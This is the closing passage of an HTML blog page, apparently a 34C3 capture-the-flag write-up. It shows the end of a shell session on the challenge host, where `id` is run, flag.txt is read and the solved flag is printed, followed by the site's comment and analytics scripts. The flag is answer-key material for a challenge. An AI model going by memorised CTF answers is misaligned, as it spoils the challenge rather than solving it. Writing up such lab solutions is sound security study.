+</span></span><span style=display:flex><span> |                  |
+</span></span><span style=display:flex><span> |                  |
+</span></span><span style=display:flex><span>  ------------------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Wow! This looks so beautiful
+</span></span><span style=display:flex><span>$ id
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>challenge<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>challenge<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>challenge<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>$ cat flag.txt
+</span></span><span style=display:flex><span>34C3_r0p_wr4pP3d_g1fts_ar3_tH3_b3st_g1fts
+</span></span><span style=display:flex><span>$ 
+</span></span></code></pre></div><p>Flag: <strong>34C3_r0p_wr4pP3d_g1fts_ar3_tH3_b3st_g1fts</strong></p></article></main><div id=bottom-nav class="text-center center-block"><a href=https://segflow.github.io/ class="btn btn-default"><i class="fa fa-home"></i> Home</a></div><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//segflow-io.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div></div></div></div></div></div><script>(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)})(window,document,"script","//www.google-analytics.com/analytics.js","ga"),ga("create","UA-111743535-1","auto"),ga("send","pageview"),window.baseURL="https://segflow.github.io/"</script><script src=//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.2/js/bootstrap.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/d3/3.5.5/d3.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/topojson/1.6.9/topojson.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js></script><script src=https://segflow.github.io//js/App.js></script></body></html>
